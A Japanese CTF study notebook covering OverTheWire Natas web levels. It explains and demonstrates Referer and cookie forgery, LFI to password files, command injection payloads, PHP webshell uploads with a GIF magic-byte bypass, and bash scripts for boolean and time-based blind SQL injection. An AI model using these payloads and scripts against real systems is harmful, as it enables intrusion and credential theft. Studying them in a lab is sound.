# CTFテクニックマニュアル（Web編）

Natas（OverTheWire）などWeb系CTFで学んだ，ブラウザ・HTTP・PHPまわりのテクニック集．

（ここからNatasの進行に合わせて追記していきます）

---

## ページのソース（View Source）にヒントが直書きされていることがある

ブラウザが画面に描画する内容と，サーバーが実際に送ってきたHTMLの中身は別物．`<!-- -->`で囲まれた**HTMLコメント**は画面には表示されないが，ソースを見れば読める．

```
右クリック → ページのソースを表示
（ショートカット: Ctrl+U，Macは Cmd+Option+U）
```

`<!--` から始まる行がないか探すのが第一歩．Web系CTFの入門レベルでは，コメントの中に次のレベルのパスワードやヒントがそのまま書かれている，という定番パターンがよくある．

---

## 右クリック無効化はソースを隠せていない

JavaScriptで右クリックメニューを潰しているだけのページがある（`oncontextmenu`イベントを止めているだけ）．これは「メニューを出さない」だけで，サーバーが送ってきたHTML自体を隠しているわけではないため，他の手段で普通にソースが見える．

```
Ctrl+U （Macは Cmd+Option+U）
```

または，アドレスバーに`view-source:`を先頭に付ける．

```
view-source:http://対象のURL
```

**教訓**: 見た目上の制限（メニューが出ない等）と，実際にデータへのアクセス自体が塞がれているかは別問題．1つの手段が塞がれていても，別の手段（ショートカットキー，URL直指定，開発者ツールなど）が残っていないか探す．

---

## ディレクトリリスティングで，意図せず公開されたファイルを見つける

ページのソースに`<img src="files/pixel.png">`のような，**フォルダ経由**のファイルパスが書かれていたら，そのファイル名部分を消してフォルダ自体にアクセスしてみる．

```
http://対象ホスト/files/
```

サーバーの設定によっては，指定されたファイルが1つも無いのに，そのフォルダの中身を一覧表示してしまうことがある（ディレクトリリスティング）．画像1枚だけ置かれているつもりが，`users.txt`のような無関係なファイルまで同じフォルダに置かれていて，それも一緒に見えてしまう，というのが典型パターン．

**教訓**: 「1つのファイルへのパスが分かった」ということは，「そのファイルが置かれている場所（フォルダ）」の存在も分かったということ．そのフォルダ自体に，他にも見えてはいけないファイルが置かれていないか確認する習慣をつける．

---

## `robots.txt`は「隠したい場所リスト」が誰でも読める

`robots.txt`は，検索エンジンのクローラーに対して「ここは巡回・インデックスしないでほしい」と伝えるための設定ファイル．サイト運営者が「検索結果に出したくない場所」を書くものだが，このファイル自体は誰でも自由に読める公開ファイルなので，**隠したい場所のリストを人間が直接覗ける**という皮肉な弱点になる．

```
http://対象ホスト/robots.txt
```

中に`Disallow: /s3cr3t/`のようなパスが書かれていたら，そこに直接アクセスしてみる．ディレクトリリスティングと組み合わさって，さらに別のファイル（`users.txt`など）が見つかることも多い．

**教訓**: 「隠す」ために使われる仕組み（`robots.txt`，コメントアウト，非表示のUI要素など）は，それ自体が「どこに何を隠したか」のヒントになっていることが多い．

---

## Refererヘッダーは自己申告なので偽装できる

`Referer`（リファラー）は，「直前にどのページを見ていてここに来たか」をブラウザが自動で申告するHTTPヘッダー．「特定のページから来た場合だけアクセスを許可する」というチェックに使われることがあるが，これはあくまで**送信側（クライアント）の自己申告**であり，サーバー側に「本当にそこから来たか」を検証する手段はない．つまり自由に偽装できる．

`curl`で，Basic認証とRefererを指定したリクエストを送る．

```bash
curl -s -u ユーザー名:パスワード -e "偽装したいReferer URL" "アクセス先URL"
```

- `-s`（`--silent`） : 進捗バーなどの余計な表示を消し，レスポンス本文だけを出す
- `-u`（`--user`，**小文字**） : サーバー自体への基本認証（ログイン）情報．**大文字の`-U`（`--proxy-user`）はプロキシ用で別物なので注意**（`-U`を使うと認証情報が送られず401エラーになる）
- `-e`（`--referer`） : Refererヘッダーに指定したURLをセットする

**教訓**: HTTPヘッダー（Referer，User-Agentなど）はすべてクライアント側が自由に書ける「申告」に過ぎない．「〇〇からのアクセスだけ許可」という作りのチェックは，ヘッダー偽装で突破できることが多い．

---

## Cookieも自己申告なので書き換えられる

Cookieは，サーバーが`Set-Cookie`ヘッダーで渡してくる小さなデータで，以降のリクエストではブラウザが自動的に`Cookie`ヘッダーとして送り返す．ログイン状態などを覚えておくためによく使われるが，Refererと同様，**クライアント側に保存されているだけの自己申告データ**なので自由に書き換えられる．

まず，サーバーがどんなCookieを返してきているか確認する．

```bash
curl -s -v -u ユーザー名:パスワード "URL" 2>&1 | grep -i cookie
```

`Set-Cookie: loggedin=0`のような値が見えたら，`1`に書き換えて送り返してみる．

```bash
curl -s -u ユーザー名:パスワード -b "loggedin=1" "URL"
```

`-b`（`--cookie`）で，自分から送るCookieの中身を直接指定できる．

**`2>&1`について**: `curl -v`の詳細情報（`Set-Cookie`を含む）は標準エラー出力（`2`）に出るため，そのままでは`| grep`（標準出力`1`しか読めない）に渡らない．`2>&1`を付けることで「標準エラー出力を標準出力に合流させる」ことができ，`grep`で検索できるようになる（`&1`の`&`は「1番のファイルではなく，標準出力という場所そのもの」を指すという意味）．

**教訓**: Cookieも「クライアントが持っているだけのデータ」．サーバー側で暗号署名などの検証をしていない単純な値（`loggedin=0/1`のようなフラグ）は，そのまま書き換えて送り返せてしまう．

---

## `include`されたファイルに直接アクセスすると中身が生で見える

PHPの`include "includes/xxx.inc";`のような行は，そのファイルの中身をその場に読み込んで実行するという意味．通常は実行結果だけがページに反映され，ソースコード自体は表に出ない．

しかし，**そのファイル自体のURLに直接アクセスしたときにどう扱われるか**は別問題．Webサーバーは拡張子でファイルの扱いを判断しており，`.php`はPHPとして実行されるが，`.inc`（includeファイル用の慣習的な拡張子）はサーバーの設定次第でPHPとして実行されず，**中のPHPコードがそのまま生テキストとして表示されてしまう**ことがある．

```
http://対象ホスト/includes/secret.inc
```

**教訓**: `include`／`require`されているファイル名がソースやエラーメッセージから分かったら，そのファイルに直接アクセスできないか（拡張子がPHPとして実行されない設定になっていないか）を確認する．

---

## パラメータでファイル名を指定させる作り（LFI／ディレクトリトラバーサル）

`?page=home`のようなURLで，サーバー内部が`include($_GET['page'] . ...)`のように，**ユーザーの指定した値でincludeするファイルを決めている**ことがある．この値に何のチェックもなければ，`home`のような想定内の値の代わりに，任意のファイルパスを渡して読み込ませられる（Local File Inclusion／LFI）．

- 相対パスで遡る場合: `../../../../etc/natas_webpass/natas8`（`../`を十分な回数重ねてルート`/`まで戻り，そこから目的のパスを指定）
- **先頭に`/`を付けた絶対パス**なら，現在地に関係なく直接指定できるため`../`が一切不要: `/etc/natas_webpass/natas8`

絶対パスの方が短く済むだけでなく，`../`という文字列パターンをそのまま検知してブロックするような簡易的なセキュリティ対策（下記参照）を回避できることもある．

**教訓**: 「特定の文字列（`home`, `about`など）を渡すとページが切り替わる」仕組みを見たら，その値がそのままファイルパスとしてサーバー内部で使われていないか疑う．絶対パスが使えるなら`../`より優先して試す．

---

## `curl`が「何も表示しない」ときは`-S`でエラーを出す

`-s`（silent）は進捗バーだけでなく，**接続エラーなどのメッセージも一緒に隠してしまう**．そのため「`curl`を実行したのに何も表示されない（プロンプトがすぐ戻ってくる）」ときは，実際には裏でエラーが起きているのにそれが見えていないだけ，というケースがよくある．

```bash
curl -sS -i -u ユーザー名:パスワード "URL"
```

- `-S`（大文字，`--show-error`） : `-s`と組み合わせて，「進捗バーは消すが，エラーメッセージは表示する」
- `-i` : レスポンスヘッダー（ステータスコードなど）も一緒に表示する

`curl: (56) Recv failure: Connection reset by peer`のようなエラーが見えれば，サーバー側（またはその手前の防御機構）が接続そのものを強制的に切っていることが分かる．典型的には，`../`のような露骨な攻撃パターンを検知してブロックする簡易フィルターが疑われる（上記の絶対パスで回避できることがある）．

**教訓**: `curl`で原因不明の「無反応」に遭遇したら，まず`-sS`（または`-v`）でエラーやステータスコードを可視化してから原因を切り分ける．

---

## 多段の変換で作られた値は，逆順に辿れば元に戻せる

PHPのソースに，`bin2hex(strrev(base64_encode($secret)))`のような，**複数の変換を順番に重ねる**関数が書かれていることがある．「入力した値をこの関数に通した結果が，埋め込まれた値と一致するか」をチェックする作りの場合，正解の`$secret`は，この変換を**逆の順番で，逆の操作を**行えば求められる．

「A（base64エンコード）して，B（文字列反転）して，C（hex化）する」で作られたなら，「Cの逆（hexを戻す）→ Bの逆（もう一度反転する）→ Aの逆（base64デコード）」という**逆順**で辿る．

```bash
enc="埋め込まれていたhex文字列"
echo -n "$enc" | xxd -r -p | rev | base64 -d
```

- `echo -n` : 末尾に余計な改行を付けずに文字列を出力する（改行が混ざると後続の変換結果がずれる）
- `xxd -r -p` : `-p`（plain）を付けることで，オフセットや区切りのない「ただのhex文字列」を元のバイナリ（文字列）に戻せる（`-p`無しだと，装飾付きの通常hexdump形式として解釈されて失敗する）
- `rev` : 1行の文字列を，先頭と末尾から順に入れ替えて左右反転する（反転は2回行うと元に戻るので，反転済みの値をもう一度`rev`すれば元の並びに戻る）
- `base64 -d` : 最後にBase64をデコードして元の文字列を得る

**教訓**: 「関数を通した結果」から元の入力を逆算したいときは，使われている変換の**順番と，それぞれの逆操作**を1つずつリストアップし，最後にかけた変換から順に戻していく．

---

## OSコマンドインジェクション: 入力にシェルの特殊記号を混ぜて別コマンドを実行させる

`passthru()`, `exec()`, `system()`などのPHP関数は，**渡された文字列をそのままシェル（bashなど）に渡して実行させる**．ユーザーの入力をチェックなしでこの文字列に直接埋め込んでいるコードがあると危険．

```php
passthru("grep -i $key dictionary.txt");
```

`$key`に`;`（セミコロン）を混ぜると，シェルはそこで「1つのコマンドが終わり，次の別のコマンドが始まる」と解釈する．`$key`を`"; cat /etc/natas_webpass/natas10 ;"`にすると，実行される文字列は

```
grep -i ; cat /etc/natas_webpass/natas10 ; dictionary.txt
```

となり，シェルには`grep -i`（不完全でエラー）／`cat /etc/natas_webpass/natas10`（本命）／`dictionary.txt`（存在せずエラー）という**3つの独立したコマンド**に見える．`;`区切りは前のコマンドの成否に関係なく次を実行するので，中央の`cat`だけが目的通り動き，その出力がページにそのまま表示される．

```bash
curl -s -G -u ユーザー名:パスワード --data-urlencode "needle=; cat /etc/natas_webpass/natas10 ;" "URL"
```

- `-G` : `--data-urlencode`の内容をPOSTではなくGETのクエリパラメータとして送る
- `--data-urlencode` : `;`やスペースなど，URLの中で特別な意味を持つ文字を安全な形（パーセントエンコード）に自動変換して送る．サーバー側では元の文字に戻って渡る

**教訓**: 「入力した文字列をそのままコマンドの一部として使っている」処理を見つけたら，コマンドの区切り文字（`;`, `|`, `&&`, `` ` ``など）を混ぜて，追加のコマンドを実行できないか試す．

---

## 特定の記号だけを禁止するフィルターは，リストにない別の区切り文字で回避できる

コマンドインジェクション対策として，`;`, `|`, `&`のような**代表的な区切り文字だけ**を禁止するチェックが入っていることがある．

```php
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
}
```

`[;|&]`は正規表現の**文字クラス**で，「この中に書かれた文字のうち，どれか1つでも含まれていないか」をチェックする書き方．`[]`の中の`|`は，`[]`の外で使うときの「OR」の意味ではなく，**ただの文字「`|`」そのもの**として扱われる点に注意（`[]`の中と外で`|`の意味が変わる）．

しかし，シェルにとってコマンドを区切れる記号は`;`, `|`, `&`だけではない．**改行文字（`\n`）も同様にコマンドの区切りとして働く**．リストに`\n`が入っていなければ，これで同じ攻撃が再現できる．

```bash
curl -s -G -u ユーザー名:パスワード --data-urlencode $'needle=\n本当に実行したいコマンド\n' "URL"
```

`$'...'`（ANSI-Cクォーティング）を使うと，`\n`が実際の改行文字として展開された状態で文字列を組み立てられる．

**教訓**: 禁止文字リストを見たら，「そのリストに載っていないだけで，同じ役割を果たせる別の記号（改行，タブ，バッククォートなど）はないか」を疑う．フィルターは`;`, `|`, `&`だけを塞いでも，シェルの区切りはそれだけではない．

---

## XOR暗号のCookieを「既知平文攻撃」で偽装する

サーバーがCookieに状態（例: `{"showpassword":"no","bgcolor":"#ffffff"}`というJSON）を保存するとき，`$key`という伏せられた鍵でXOR暗号化 → Base64エンコードしていることがある．鍵の中身が分からなくても，次の性質を使って突破できる．

**原理**: `平文 XOR 鍵 = 暗号文`が成り立つなら，`暗号文 XOR 平文 = 鍵`も成り立つ（XORは同じ値で2回かけると元に戻る）．つまり，**平文と暗号文のペアが1組でも手に入れば，鍵（の繰り返しパターン）を逆算できる**．

**平文が分かっている状況をどう作るか**: ソースコードを読み，「Cookieを送らずにアクセスすると，サーバーは決まった内容（デフォルト値）を暗号化して返す」という箇所を見つける．これで，中身が確実に分かっている暗号文を意図的に手に入れられる．

**手順**

1. Cookie無しでアクセスし，`Set-Cookie`の値を取得する（`curl -D headers.txt`など）
2. URLデコード（`%2F`→`/`, `%3D`→`=`）してから，Base64デコードする（**この順番が重要**．URLデコードを先にしないと，Base64として正しく解釈できない）
3. 予測した平文（PHPの`json_encode`が実際に出す形。`{}`で囲み`:`区切り，スペース無し）と，暗号文を1バイトずつXORして「キーストリーム」を求める
4. キーストリームに短い周期の繰り返しパターンが見えたら，それが鍵の長さと中身
5. 求めた鍵を使い，望みの平文（例: `showpassword`を`"yes"`にしたJSON）を同じ手順でXOR暗号化 → Base64エンコード → URLエンコードし，`Cookie`として送り返す

**Pythonで書くときの注意点**

- `bytes`オブジェクト（`b'...'`）は，1バイトずつ取り出すと自動的に整数になる．一方，普通の`str`（例: `key = "kBSw"`）から1文字取り出すと文字列になるので，**そのままでは数値とXORできずエラーになる**（`ord(文字)`で数値に変換するか，`key.encode()`で先にbytes化しておく）
- 予測する平文をPythonの`json.dumps()`で作る場合，デフォルトはキーと値の間にスペースが入る．PHPの`json_encode`はスペースを入れないので，`separators=(',', ':')`を指定して詰めた形に合わせる必要がある

**教訓**: 「鍵が分からないから解けない」ではなく，「平文が確実に分かる状況を自分で作れないか」をまずソースコードから探す．XORのような単純な暗号は，既知平文が1つあれば鍵ごと崩れる．

---

## ファイルアップロードで，拡張子の申告とファイルの中身が食い違っている

アップロード機能が，保存するファイルの**拡張子**を，実際にアップロードした**ファイルの中身**ではなく，フォームの**別のパラメータ（ファイル名の申告）**から決めていることがある．

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```

サイズ制限などはあっても，**中身がPHPコードかどうかを一切チェックしていない**場合，「中身はPHPコード，でも申告する拡張子だけ`.php`にする」ファイルを送り込めば，サーバー上で実行可能なPHPスクリプトをそのまま設置できてしまう．

```bash
curl -s -u ユーザー名:パスワード -F "filename=x.php" -F "uploadedfile=@shell.php" "URL"
```

- `-F "filename=x.php"` : 拡張子だけを`.php`だと申告する（コードが読む方のパラメータ）
- `-F "uploadedfile=@shell.php"` : 実際にアップロードするファイルの中身

アップロード後に返ってくる保存先パスに直接アクセスすれば，中のPHPコードが実行される．

**教訓**: 「拡張子の判定に使っている値」と「実際のファイルの中身」が別々のパラメータになっている実装は，2つを食い違わせることで偽装できる．

---

## ヒアドキュメント（`<< 'EOF'`）で，クォートの事故を防ぐ

`echo '...'`でPHPコードのようにクォートが入り組んだ文字列をファイルに書こうとすると，ターミナルの自動置換などで意図せず`"`が消えたり変換されたりすることがある．

```bash
cat > shell.php << 'EOF'
<?php system("cat /etc/natas_webpass/natas13"); ?>
EOF
```

区切り文字（`EOF`）を**シングルクォートで囲む**と，`EOF`とだけ書かれた行が来るまでの中身を，変数展開やクォートの特殊解釈をせず**書いた通りそのまま**扱ってくれる．複数行や，クォートを含む複雑な内容をファイルに書きたいときは，`echo`より安全．

**教訓**: 一発で書いたファイルの中身は，思い込みで信用せず`cat`で必ず見直す．特にクォートや特殊記号が絡む内容は，ヒアドキュメントで書く方が事故を防げる．

---

## `exif_imagetype`による画像チェックは，先頭数バイトしか見ていない

拡張子の申告だけでなく，`exif_imagetype()`でファイルの中身が本当に画像かどうかをチェックしていることがある．

```php
if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

この関数は，ファイル**全体**を検証しているわけではなく，**先頭の数バイト**に，画像形式ごとに決まった「マジックナンバー」（識別用の決まったバイト列）があるかどうかだけを見ている．例えばGIF画像は`GIF89a`という6バイトの文字列から始まる，という決まりがある．

そこで，**ファイルの先頭にこのマジックナンバーだけを付け足し，その直後にPHPコードを続ける**ことで，「`exif_imagetype`には画像だと判定される」かつ「PHPとして実行すれば中のコードも動く」という，両方の性質を持つファイルを作れる．

```bash
cat > shell.php << 'EOF'
GIF89a
<?php system("cat /etc/natas_webpass/natas14"); ?>
EOF
```

**教訓**: ファイルの「種類チェック」の多くは，中身全体を精査しているのではなく，**先頭の決まったバイト列（マジックナンバー）の有無**だけを見ている簡易的なものであることが多い．本物の画像である必要はなく，「判定ロジックが見ている部分だけ」を満たせばよい．

---

## ヒアドキュメントの各行に`\`（行末バックスラッシュ）を付けてはいけない

ヒアドキュメント（`<< 'EOF'`）で複数行を入力するとき，各行の末尾に`\`を付けてしまうと，シェルが「行の継続（1つのコマンドとして繋げる）」の意味だと解釈してしまい，意図通りに書き込まれない．

ヒアドキュメントはそれ自体が複数行の入力を受け付ける仕組みなので，`\`は不要．`<< 'EOF'`の後はEnterで改行し，1行ずつそのまま入力し，最後に`EOF`とだけ書かれた行で終える．

**教訓**: ヒアドキュメントの中では，行と行の間に特別な記号（`\`など）を挟まない．書いたら`cat`で中身を必ず確認する習慣をつける．

---

## SQLインジェクション: 入力した`"`でクエリの構造を乗っ取る

ユーザーの入力を，チェックやエスケープなしでSQL文に直接埋め込んでいるコードがある．

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

これは，`username`と`password`の値を`"`で囲んで挟み込み，1つのSQL文を組み立てている．**入力値の中に`"`を含めれば，「値の一部」のつもりで書いた文字が，SQL文の側からは「文字列の終わり」として扱われてしまう**．つまり，クエリの構造そのものを書き換えられる．

**素朴な`" or "1"="1`だけでは不十分なことがある**: SQLは`AND`を`OR`より先に評価するため，`username="" or "1"="1" and password="値"`は`username="" or ("1"="1" and password="値")`という意味になり，`password`が正しくない限りねらい通りに`true`にならないことがある．

**確実な方法: `--`（ハイフン2つ＋スペース）でそれ以降をコメントアウトする**

```
username: " or "1"="1" -- 
```

を送ると，クエリは

```sql
SELECT * from users where username="" or "1"="1" -- " and password="..."
```

となり，`--`より後ろは全部コメット（無視）される．結果として実質

```sql
SELECT * from users where username="" or "1"="1"
```

だけが実行され，`password`のチェック自体が消え，常に真になる条件（`"1"="1"`）でログイン成功してしまう．

```bash
curl -s -u ユーザー名:パスワード --data-urlencode 'username=" or "1"="1" -- ' --data-urlencode 'password=x' "URL"
```

**教訓**: 入力値をSQL文にそのまま埋め込んでいる箇所を見たら，`"`（や`'`）を混ぜて文字列の境界を操作できないか試す．単純な`OR`挿入がうまくいかないときは，`AND`との優先順位や，`--`によるコメントアウトで後続条件ごと無効化できないか考える．

---

## ブラインドSQLインジェクション: Yes/Noの応答だけからデータを1文字ずつ読み出す

SQLインジェクションができても，画面には`"This user exists."`／`"This user doesn't exist."`のような**Yes/Noの結果しか表示されない**ことがある．それでも，こちらが仕込む条件次第で「はい／いいえ」という1ビットの答えを何度も引き出せるので，**知りたいデータについての質問を1つずつ聞いていく**ことで中身を読み取れる（ブラインドSQLインジェクション）．

```
username: natas16" and password like "a%
```

これは「natas16というユーザーで，かつパスワードが`a`で始まっているか」という質問になる．`a`〜`z`, `A`〜`Z`, `0`〜`9`を順番に試し，`"This user exists."`が返ってきた文字を確定させ，それを足した状態で次の文字を同じように総当たりする，というのを繰り返せば，パスワード全体を1文字ずつ復元できる．

```bash
#!/bin/bash
USER=natas15
PASS=パスワード
URL="http://natas15.natas.labs.overthewire.org/index.php"
CHARS='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
found=""

for pos in $(seq 1 32); do
  for (( i=0; i<${#CHARS}; i++ )); do
    c="${CHARS:$i:1}"
    payload="natas16\" and password like \"${found}${c}%"
    result=$(curl -s -u $USER:$PASS --data-urlencode "username=$payload" "$URL")
    if echo "$result" | grep -q "This user exists"; then
      found="${found}${c}"
      break
    fi
  done
done
echo "password: $found"
```

- 外側のループ : パスワードの「何文字目か」を進める
- 内側のループ : その位置について，候補の文字を1つずつ試す
- `like "${found}${c}%"` : 「これまでに分かった文字列＋今試している1文字」で始まっているか，という質問を作る
- `grep -q "This user exists"` : 応答が「はい」かどうかを，画面に表示せず判定だけする（if文の条件に使う）

**教訓**: 直接データが見えなくても，「はい／いいえ」の応答さえ操作・観測できれば，質問を工夫して繰り返すことでデータを間接的に全部読み出せる．これがブラインド（盲目的な）攻撃の基本発想．

---

## MySQLの`=`/`LIKE`はデフォルトで大文字小文字を区別しない（`BINARY`で区別させる）

MySQLの多くの設定（照合順序／collation）では，`"X" = "x"`が**真（同じ）**と判定される．つまり，ブラインドSQLインジェクションで1文字ずつ総当たりするとき，候補の文字列（`ABC...abc...`のように大文字を先に並べたもの）の中に**大文字と小文字の両方**が入っていると，本当は小文字が正解でも，先に試した大文字の時点で「一致した」と誤判定されてしまう．

**症状**: 復元したパスワードの英字部分が，不自然に**すべて大文字**になる．

**直し方**: 比較に`BINARY`を付けると，大文字・小文字を区別する（バイト単位の厳密な比較になる）．

```sql
password like binary "候補文字%"
```

```bash
payload="natas16\" and password like binary \"${found}${c}%"
```

これで，同じアルファベットでも大文字と小文字が別物として扱われ，本来の大文字・小文字のパターンを正しく復元できる．

**教訓**: 文字列を1文字ずつ総当たりで復元するとき，比較演算が大文字小文字を区別しない設定になっていないか疑う．特に，復元結果が不自然に偏っている（全部大文字，特定の文字種に寄っている等）ときはこれを疑う．

---

## クォートで囲まれた入力への command injection: `$()`コマンド置換でクォート無しにコマンドを実行する

```php
passthru("grep -i \"$key\" dictionary.txt");
```

このように，自分の入力（`$key`）が**すでにダブルクォートで囲まれた状態**でシェルに渡っている場合，natas9/10で使った「`;`や改行で区切って別コマンドを実行する」という手は使えない．クォートの**外**に出られないと，区切り文字を使っても「クォートの中の，ただの1文字」として扱われるだけだから．

しかし，`;`, `|`, `&`, バッククォート，シングルクォート，ダブルクォートが禁止されていても，**`$`と`(`, `)`が禁止されていなければ**，ダブルクォートの**中であっても**コマンド置換`$(コマンド)`は実行される．これはクォートを閉じる必要が一切ない．

```bash
--data-urlencode 'needle=$(コマンド)'
```

**重要な注意点1**: `$(コマンド)`の中身は，画面には直接見えない．なぜなら，実行結果は「`grep`が検索するパターン」として使われるだけで，`grep`が最終的に検索対象ファイル（`dictionary.txt`）の中からマッチした行を返してくれない限り，何も表示されないから．

**重要な注意点2**: `$(...)`の中身は，たとえ外側がダブルクォートで囲まれていても，**改行で複数の文（コマンド）に区切れる**（`;`を使わなくてよい）．中カッコの中身は，独立した1つのミニスクリプトとして解釈されるため．

**ファイルへの書き込みができない場合の対処: 既知の単語に変換して，Yes/Noの信号にする**

読みたいファイルの中身をそのまま検索パターンにしても，辞書ファイルに実在する可能性はほぼゼロで，結果は常に「空」になってしまう．そこで，natas15のブラインドSQLインジェクションと同じ発想で，「読みたいデータの特定の文字が，こちらの推測と一致するか」を**Yes/Noの質問に変換**し，一致すれば辞書に確実にある単語（`cat`など）を，しなければ絶対にない文字列（`zzznomatchzzz`など）を出力させる．

```bash
payload="X=\$(cut -c${pos} /etc/対象のパスワードファイル)
if [ \$X = ${candidate} ]
then echo cat
else echo zzznomatchzzz
fi"
needle="\$(${payload})"
```

- `cut -cN` : ファイルのN文字目だけを取り出す
- クォート（`"`/`'`）が使えないので，`if [ $X = 文字 ]`のように**クォート無しで**比較する
- `else`で必ず何か（辞書に絶対ない文字列）を出力させることが重要．何も出力しないと，検索パターンが空文字になり，`grep`は「空文字＝すべての行にマッチ」と扱ってしまうため，正解・不正解の区別がつかなくなる

これをnatas15のときと同じ「位置ごと・候補文字ごとの2重ループ」で回せば，フィルターに阻まれても1文字ずつパスワードを復元できる．

**実際に使ったスクリプト（natas16→natas17）**

```bash
#!/bin/bash
USER=natas16
PASS=パスワード
URL="http://natas16.natas.labs.overthewire.org/index.php"
CHARS='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
found=""

for pos in $(seq 1 32); do
  for (( i=0; i<${#CHARS}; i++ )); do
    c="${CHARS:$i:1}"
    payload="X=\$(cut -c${pos} /etc/natas_webpass/natas17)
if [ \$X = ${c} ]
then echo cat
else echo zzznomatchzzz
fi"
    needle="\$(${payload})"
    result=$(curl -s -G -u $USER:$PASS --data-urlencode "needle=$needle" "$URL")
    if echo "$result" | grep -q "cat's"; then
      found="${found}${c}"
      echo "現在までに分かった文字列: $found"
      break
    fi
  done
done

echo "password: $found"
```

**教訓**: 入力がクォートで囲まれていて区切り文字が使えなくても，`$`や`()`が禁止されていなければコマンド置換で実行はできる．ただし実行結果が直接見えるとは限らないので，見える形（既知の単語かどうか）に翻訳し直す一手間が必要になることが多い．

---

## 時間差ブラインドSQLインジェクション: 画面に何も出なくても`SLEEP()`で時間を測って読み取る

natas15と同じ構造でも，「存在する／しない」の`echo`自体がコメントアウトされていて，**画面の見た目が真でも偽でも一切変わらない**ことがある．これだとnatas15のような内容ベースの判定はできない．

そこで，画面の中身ではなく，**応答が返ってくるまでの時間**を信号として使う．MySQLの`SLEEP(秒数)`は，指定秒数だけ処理を止めてから`0`を返す関数．

```sql
username="" or if(substring(password,${pos},1)="${c}", sleep(2), 0) -- 
```

- `substring(password, ${pos}, 1)` : `password`列の${pos}文字目だけを取り出す
- `if(条件, A, B)` : プログラムの`if`文とは違い，**条件に応じてAかBのどちらかの「値」を返すだけの関数**．条件が真なら`sleep(2)`（2秒待ってから`0`を返す），偽ならそのまま`0`を返す
- `if`が最終的に返す値（どちらも`0`）自体には意味がない．知りたいのは，**`sleep(2)`が実際に実行されて2秒待たされたかどうか**という副作用（時間差）だけ

`curl`の`-w "%{time_total}"`で応答時間を測り，一定の秒数（例: 1.5秒）より長ければ「正解」と判定する．

```bash
t=$(curl -s -o /dev/null -w "%{time_total}" -G -u ユーザー名:パスワード --data-urlencode "username=$payload" "$URL")
is_slow=$(awk -v t="$t" 'BEGIN{print (t > 1.5) ? 1 : 0}')
```

`awk`を使っているのは，`bash`の標準機能だけでは小数点を含む数値の比較（`2.6 > 1.5`など）ができないため．

natas15のときと同じ「位置ごと・候補文字ごとの2重ループ」に組み込めば，画面に何も表示されなくても1文字ずつ復元できる．ここでも**MySQLの`=`は大文字小文字を区別しない**ので，`substring(...)`の前に`binary`を付けるのを忘れないこと（忘れると，先に試した方の大文字小文字に丸められてしまう）．

**ハマりどころ1: `username="natas18" or if(...)` の`or`はスコープ漏れを起こす**

`or`でつなぐと，`natas18`の行では`username="natas18"`の時点でOR全体がTrueと確定してしまい，`if(...)`（sleepの副作用）が評価されない可能性がある．さらに他の行に対しても`if(...)`だけがそのまま評価され得るので，狙った行以外のデータに反応してしまうこともある．正しくは`and`でつなぎ，「`natas18`の行，かつ，その`password`のこの位置がこの文字」という形にスコープを絞る．

```sql
username="natas18" and if(binary substring(password,${pos},1)='${c}',sleep(2),0) -- 
```

**ハマりどころ2: ネットワークの一瞬の遅延を「SLEEPが発動した」と誤検知する**

`and`に直しても，「1.5秒を超えたら即座にその文字で確定して次の桁へ`break`」という判定方法自体に弱点がある．サーバーやネットワークがたまたま一瞬重くなっただけで，SLEEPが発動していないのに閾値を超えてしまうことがある．一度`break`して次の桁に進むと，後から誤りに気づく手段がない．

対策は，怪しい（閾値を超えた）文字が見つかったら即確定せず，**同じリクエストをもう一度送って，2回とも遅ければ確定**という二重チェックを入れること．本物の`SLEEP(2)`は何度リクエストしても毎回ほぼ確実に2秒以上かかるが，ただの偶然の遅延（ジッター）が2回連続で起きる可能性は低い．実際にnatas17→18の抽出でも，1回目だけ4秒かかって2回目は1.1秒だった文字（誤検知）を正しく棄却できたケースがあった．

**実際に使ったスクリプト（natas17→natas18，二重チェック版）**

```bash
#!/bin/bash
USER=natas17
PASS=パスワード
URL="http://natas17.natas.labs.overthewire.org/"
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
THRESHOLD=1.5
found=""

request_time() {
    local payload="$1"
    curl -s -o /dev/null -w "%{time_total}" -G -u "$USER:$PASS" \
        --data-urlencode "username=$payload" "$URL"
}

is_slow() {
    local t="$1"
    awk -v t="$t" -v th="$THRESHOLD" 'BEGIN { print (t > th) ? 1 : 0 }'
}

for pos in $(seq 1 32); do
    matched_char=""
    for (( i=0; i<${#CHARS}; i++ )); do
        c="${CHARS:$i:1}"
        payload="natas18\" and if(binary substring(password,${pos},1)='${c}',sleep(2),0) -- "

        t1=$(request_time "$payload")
        if [ "$(is_slow "$t1")" -eq 1 ]; then
            # 怪しいのでもう一度リクエストして再確認(誤検知対策)
            t2=$(request_time "$payload")
            if [ "$(is_slow "$t2")" -eq 1 ]; then
                matched_char="$c"
                echo "pos=${pos}: '${c}' で確定 (1回目 ${t1}秒 / 2回目 ${t2}秒)"
                break
            fi
        fi
    done
    found="${found}${matched_char}"
    echo "現在までに分かった文字列: $found"
done
echo "最終的に分かった文字列: $found"
```

natas17 → natas18（パスワードは伏せています．ログイン確認済み）

**教訓**:
- 画面の出力に頼れない（内容ベースの判定ができない）ときは，「見える差」の代わりに「かかる時間の差」を作り出せないか考える．`SLEEP()`のような，値を返しつつ時間だけを操作できる関数が鍵になる．
- `or`と`and`はブラインドSQLiの結果を左右する重要な違い．注入した条件を「狙った行だけ」に絞れているか常に確認する．
- time-based blind SQLiは原理的にネットワーク遅延と区別がつきにくいので，1回の判定だけで確定せず，**同じリクエストを複数回叩いて再現性を確認する**ことで誤検知を減らせる．

---

## `dquote>`が出たら，クォートの対応が崩れている

コマンド実行中に`dquote>`という見慣れないプロンプトが出て入力がおかしくなったら，**ダブルクォート（`"`）の数が奇数になっていて，シェルが「まだ閉じていない」と待っている状態**．典型的には，開き忘れ・閉じ忘れ・引数の途中に余分な`"`が紛れ込んでいる，などが原因．

```
Ctrl+C
```

